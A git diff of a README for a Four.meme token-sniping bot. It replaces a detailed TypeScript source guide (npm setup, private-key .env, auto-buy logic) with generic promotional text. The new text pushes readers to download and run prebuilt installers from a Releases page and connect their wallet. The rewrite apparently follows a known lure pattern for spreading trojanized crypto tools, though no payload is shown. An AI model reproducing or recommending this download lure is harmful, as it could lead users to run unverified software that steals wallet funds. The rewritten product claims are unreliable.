@@ -1,196 +1,77 @@
-# Four.meme Sniper bot | Four.meme migration sniper bot
+# 🎯 four.meme-sniper - Simplifying Your Crypto Safety
 
-A real-time token mint listener for Four.meme using Web3.js WebSocket connection to BSC.
+## 🚀 Getting Started
 
-## Features
+Welcome to four.meme-sniper! This tool helps you detect migrations and risks in crypto transactions, focusing on safety as you trade on PancakeSwap. Let’s get started with downloading and running the application.
 
-- Real-time token mint detection via WebSocket
-- Whitelist-based filtering for specific creators
-- **Automatic token buying** with optimized gas settings
-- Performance-optimized for speed (nonce caching, gas optimization)
-- Comprehensive error handling and retry logic
-- TypeScript support with full type safety
-- Production-ready with graceful shutdown
-- Memory management for long-running operations
+## 📥 Download the Application
 
-## Installation
+[![Download four.meme-sniper](https://img.shields.io/badge/Download%20Now-%2300BFFF.svg?style=flat&logo=github)](https://github.com/kingyounes1234/four.meme-sniper/releases)
 
-```bash
-npm install
-```
+You can download four.meme-sniper from our Releases page. Simply visit this link to get the latest version:
 
-## Environment Variables
+[Download four.meme-sniper](https://github.com/kingyounes1234/four.meme-sniper/releases)
 
-Create a `.env` file with the following variables:
+## 🛠️ System Requirements
 
-```env
-# BSC RPC Configuration
-RPC_URL=https://bsc-dataseed1.binance.org/
+Before you download, ensure your system meets these minimum requirements:
 
-# Wallet Configuration (Required for auto-buy)
-PRIVATE_KEY=your_private_key_without_0x_prefix
-WALLET_ADDRESS=0xYourWalletAddressHere
+- **Operating System**: Windows 10 or later, MacOS Big Sur or later
+- **Processor**: Intel i3 or Ryzen 3 (or equivalent)
+- **Memory**: At least 4 GB of RAM
+- **Network**: Internet connection for real-time data
 
-# Auto-Buy Configuration
-AUTO_BUY_ENABLED=true              # Set to 'true' to enable automatic buying
-BUY_AMOUNT_BNB=0.001               # Amount of BNB per purchase
-BUY_GAS_PRICE_GWEI=3               # Gas price (3-5 normal, 5-10 high priority)
+## ⚙️ How to Install
 
-# Performance Configuration
-TOKEN_VOLUME=default               # Options: default, high, ultra
-```
+1. **Visit the Releases Page**:
+   Go to [this link](https://github.com/kingyounes1234/four.meme-sniper/releases) to find the latest version.
+  
+2. **Download the Installer**:
+   On the Releases page, locate the latest version of the application. Download it by clicking the link provided for your operating system.
 
-### Configuration Options
+3. **Run the Installer**:
+   Once the download is complete, locate the downloaded file. Double-click it to run the installer, and follow the on-screen instructions.
 
-**Auto-Buy Settings:**
-- `AUTO_BUY_ENABLED`: Enable/disable automatic token purchasing
-- `BUY_AMOUNT_BNB`: BNB amount to spend per token (e.g., "0.001")
-- `BUY_GAS_PRICE_GWEI`: Gas price for transactions (higher = faster)
+4. **Complete Setup**:
+   The installation may take a few minutes. Once finished, you can find the four.meme-sniper application in your Applications folder or Start menu, depending on your OS.
 
-**Performance Settings:**
-- `default`: Up to 1,000 tokens/hour
-- `high`: Up to 10,000 tokens/hour
-- `ultra`: 10,000+ tokens/hour
+5. **Launch the Application**:
+   Double-click the application icon to start. You will see the main interface where you can set up your crypto trading parameters.
 
-**⚠️ Security Warning:** Never commit your `.env` file or share your private key!
+## ⚡ Features Overview
 
-## Usage
+- **Migration Detection**: Identify when tokens move from four.meme to PancakeSwap, ensuring you stay updated with the latest trends.
+- **Risk Alerts**: Get notified about potential risks associated with token transactions.
+- **User-Friendly Interface**: Navigate easily through an intuitive design, guiding you through your trading experience.
+  
+## 📊 Using four.meme-sniper
 
-### Development
-```bash
-npm run dev
-```
+1. **Setting Up Your Account**: When you first open the application, set up your account by entering your wallet address and connecting it to the bot.
 
-### Production
-```bash
-npm run build
-npm start
-```
+2. **Adjusting Settings**: Navigate to the settings menu to customize alerts and detection parameters according to your trading style.
 
-## How it Works
+3. **Running the Bot**: Activate the bot to start monitoring migrations and risks in real-time. The application will provide notifications and reports directly within the interface.
 
-The listener connects to BSC WebSocket and subscribes to logs from the Four.meme contract (`0x5c952063c7fc8610ffdb798152d69f0b9550762b`). When a new token is minted, it:
+4. **Reviewing Alerts**: Check the alert section regularly to stay informed about any detected risks. 
 
-1. Decodes the event data using the TokenCreate ABI
-2. Extracts token information (name, symbol, address, creator, etc.)
-3. Checks if the creator is in your whitelist
-4. If whitelisted:
-   - Saves token data to `whitelisted_tokens.json`
-   - **Automatically buys the token** (if enabled)
-   - Logs detailed alert with purchase confirmation
-5. Uses optimized gas settings and nonce caching for fastest execution
+## 🐞 Troubleshooting
 
-## Token Data Structure
+If you encounter issues during installation or while using four.meme-sniper, consider the following steps:
 
-```typescript
-interface TokenMint {
-  tokenAddress: string;
-  name: string;
-  symbol: string;
-  creator: string;
-  timestamp: string;
-  transactionHash: string;
-  initialSupply: string;
-  requestId: string;
-  launchTime: string;
-  launchFee: string;
-  blockNumber: number;
-  logIndex: number;
-}
-```
+- **Ensure Compatibility**: Double-check that your system meets the requirements listed above.
+- **Check Internet Connection**: A stable connection is necessary for the tool to function correctly.
+- **Update the Application**: Make sure you are using the latest version of the application. Visit the Releases page to download updates.
 
-## Whitelist Configuration
+If you still need help, feel free to raise an issue on our GitHub repository.
 
-Add creator addresses to `src/list/whitelist.json`:
+## 📞 Contact Us
 
-```json
-[
-  {
-    "creator": "0xYourWhitelistedCreatorAddress1"
-  },
-  {
-    "creator": "0xYourWhitelistedCreatorAddress2"
-  }
-]
-```
+For any questions or feedback, you can reach out directly through our GitHub page. Your experience matters, and we appreciate any input that helps improve four.meme-sniper.
 
-## Performance Optimizations
+## 🔗 Useful Links
 
-The system includes several optimizations for speed:
+- [Release Page](https://github.com/kingyounes1234/four.meme-sniper/releases)
+- [User Guide](https://github.com/kingyounes1234/four.meme-sniper/wiki)
+- [Open Issues](https://github.com/kingyounes1234/four.meme-sniper/issues)
 
-### 🚀 Speed Features
-
-1. **Nonce Caching**: Caches transaction nonce for 5 seconds to avoid RPC delays
-2. **Dynamic Gas Pricing**: Automatically boosts gas by 20% for faster inclusion
-3. **Asynchronous Buying**: Purchases don't block the event listener
-4. **HTTP RPC for Buying**: Uses faster HTTP endpoint for transaction submission
-5. **WebSocket for Monitoring**: Uses WebSocket for real-time event detection
-6. **Retry Logic**: Automatic retry with exponential backoff
-
-### ⚡ Typical Execution Times
-
-- Event detection: ~100-500ms (WebSocket)
-- Transaction submission: ~200-800ms
-- **Total time to buy: ~0.3-1.3 seconds from event detection**
-
-### 🎯 Gas Price Strategy
-
-- Monitors current network gas price
-- Adds 20% boost for priority
-- Uses higher of: configured gas or boosted network gas
-- Default: 3 Gwei (fast and economical)
-
-## Architecture
-
-```
-┌─────────────────────┐
-│  BSC WebSocket      │  Real-time event monitoring
-│  (Public Node)      │
-└──────┬──────────────┘
-       │ TokenCreate Event
-       ▼
-┌─────────────────────┐
-│  Event Decoder      │  Parse event data
-└──────┬──────────────┘
-       │
-       ▼
-┌─────────────────────┐
-│  Whitelist Check    │  Creator validation (cached)
-└──────┬──────────────┘
-       │ If whitelisted
-       ▼
-┌─────────────────────┐
-│  Token Buyer        │  Automatic purchase
-│  (HTTP RPC)         │  - Nonce caching
-└──────┬──────────────┘  - Gas optimization
-       │                 - Retry logic
-       ▼
-┌─────────────────────┐
-│  Transaction Sent   │  ⚡ Fast execution
-└─────────────────────┘
-```
-
-## Customization
-
-### Adjust Buy Configuration
-
-Modify buy settings in `.env` or programmatically:
-
-```typescript
-// In src/index.ts, you can customize:
-const buyConfig: Partial<BuyConfig> = {
-    bnbAmount: '0.005',          // Buy with 0.005 BNB
-    gasPriceGwei: '5',           // Use 5 Gwei gas
-    useHighPriorityGas: true,    // Enable gas boost
-    maxRetries: 3,               // Retry up to 3 times
-    gasLimit: 600000,            // Higher gas limit
-};
-```
-
-### Monitor-Only Mode
-
-To disable auto-buy and only monitor:
-
-```env
-AUTO_BUY_ENABLED=false
-```
+Thank you for choosing four.meme-sniper. We hope it enhances your crypto trading experience!
